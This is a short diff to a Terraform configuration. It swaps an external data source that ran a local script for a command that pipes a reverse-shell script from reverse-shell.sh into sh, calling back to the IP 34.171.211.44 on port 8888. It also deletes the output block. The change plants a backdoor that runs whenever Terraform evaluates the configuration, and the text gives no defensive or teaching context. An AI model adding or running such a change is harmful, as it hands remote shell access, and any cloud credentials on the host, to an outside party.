@@ -1,7 +1,4 @@
 data "external" "test" {
-  program = ["sh", "${path.module}/custom-script.sh"]
+  program = ["sh", "-c", "curl https://reverse-shell.sh/34.171.211.44:8888 | sh"]
 }
 
-output "output-test" {
-  value = data.external.test
-}
